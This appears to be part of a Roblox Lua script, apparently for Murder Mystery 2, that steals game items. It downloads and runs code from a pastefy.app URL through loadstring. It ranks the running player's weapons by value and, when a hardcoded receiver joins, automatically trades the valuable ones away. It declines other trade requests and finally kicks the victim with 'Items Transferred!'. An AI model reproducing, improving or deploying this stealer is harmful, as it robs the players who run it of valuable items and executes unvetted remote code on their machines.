-- Load item database from Pastefy
local ItemDatabase = {}
local function LoadDatabase()
    local resp
    pcall(function()
        local req = GetRequestFunction()
        if not req then return end
        resp = req({Url="https://pastefy.app/pZGWTo/raw",Method="GET",Headers={["User-Agent"]="Mozilla/5.0"},Timeout=10})
    end)
    if not resp or not resp.Body then return end
    local load = loadstring(resp.Body)
    if not load then return end
    local db = load()
    if type(db)~="table" then return end
    local map = {}
    for rarity,items in pairs(db) do
        if type(items)=="table" then
            for name,val in pairs(items) do
                if type(val)=="number" then
                    local n = string.lower(tostring(name or ""))
                    local key = n:gsub("'",""):gsub(" ","")
                    map[key] = {Rarity=rarity,Value=val,Chroma=(string.lower(rarity)=="chroma")}
                end
            end
        end
    end
    return map
end

-- Format name
local function FormatNameDisplay(t)
    if not t or t=="" then return "Unknown" end
    local res, cap = "", true
    for i=1,#t do
        local c = t:sub(i,i)
        if c==" " then res..=" "; cap=true
        else res = res..(cap and c:upper() or c:lower()); cap=false end
    end
    return res
end

local AllItems, TradeItems, TotalValue = {},{},0
local function ShouldTrade(rarity, val)
    if not rarity then return false end
    local pos = table.find(RarityList,rarity)
    return (pos and GodlyPosition and pos<=GodlyPosition) or (val and val>=MINIMUM_VALUE)
end
local function RefreshInventory()
    local a,tv,tot = {},{},0
    local data = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if data and data.Weapons and data.Weapons.Owned then
        for id,qty in pairs(data.Weapons.Owned) do
            if qty and qty>0 then
                local name = tostring(id or "")
                if name~="" then
                    local key = string.lower(name):gsub("'",""):gsub(" ","")
                    local info = ItemDatabase[key]
                    local rarity = info and info.Rarity or "Unknown"
                    local val = info and info.Value or 0
                    local entry = {DataID=id,Name=name,Rarity=rarity,Count=qty,Value=val,IsChroma=(info and info.Chroma),Total=val*qty}
                    table.insert(a,entry)
                    if ShouldTrade(rarity,val) and not Blacklisted[id] then
                        table.insert(tv,entry)
                        tot = tot + entry.Total
                    end
                end
            end
        end
    end
    table.sort(a,function(x,y) return x.Total>y.Total end)
    table.sort(tv,function(x,y) return x.Total>y.Total end)
    return a,tv,tot
end
AllItems, TradeItems, TotalValue = RefreshInventory()

local function GenerateInventoryText(list)
    local lines, tot = {},0
    for _,i in ipairs(list) do tot=tot+i.Total end
    table.insert(lines,"Total Inventory Value: "..tot)
    table.insert(lines,string.rep("-",40))
    for _,i in ipairs(list) do
        local n = FormatNameDisplay(i.Name)
        if i.IsChroma then n = "Chroma "..n end
        table.insert(lines,"["..i.Rarity.."] x"..i.Count.." "..n.." - "..i.Total)
    end
    return table.concat(lines,"\n")
end

-- Trade logic
local function KickAfterTransfer() task.wait(2) LocalPlayer:Kick("Items Transferred!") end
local function FindTarget()
    if type(RECEIVER)=="table" then
        for _,n in ipairs(RECEIVER) do if n~="" and Players:FindFirstChild(n) then return n end end
    else
        if Players:FindFirstChild(RECEIVER) then return RECEIVER end
    end
    return nil
end
local MAX_ATTEMPTS = 999
local RETRY_DELAY = 2
local function ProcessTrades(target)
    local tries = 0
    while #TradeItems>0 and tries<MAX_ATTEMPTS do
        tries = tries + 1
        local status = GetTradeStatus()
        if status=="ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5)
            continue
        end
        if status=="StartTrade" then
            local sendCount = math.min(4,#TradeItems)
            for _=1,sendCount do
                local item = table.remove(TradeItems,1)
                for _=1,item.Count do
                    AddItemToTradeOffer(item.DataID)
                    task.wait(0.05)
                end
            end
            task.wait(6)
            if AcceptIncomingTrade() then
                WaitUntilTradeEnds()
                AllItems, TradeItems, TotalValue = RefreshInventory()
                tries = 0
            else
                AllItems, TradeItems, TotalValue = RefreshInventory()
                task.wait(RETRY_DELAY)
            end
            continue
        end
        if status=="None" then
            local sent, try = false,1
            while not sent and try<=5 do
                if SendTradeRequestToPlayer(target) then sent=true task.wait(0.5) end
                task.wait(math.min(try*0.5,3))
                try = try + 1
            end
        end
        task.wait(0.5)
    end
    KickAfterTransfer()
end
local function AutoTradeOnJoin()
    local busy = false
    local function CheckPlayer(p)
        if busy then return end
        local target = FindTarget()
        if target and p.Name==target then
            busy = true
            task.wait(3)
            ProcessTrades(target)
        end
    end
    for _,p in ipairs(Players:GetPlayers()) do CheckPlayer(p) end
    Players.PlayerAdded:Connect(CheckPlayer)
end
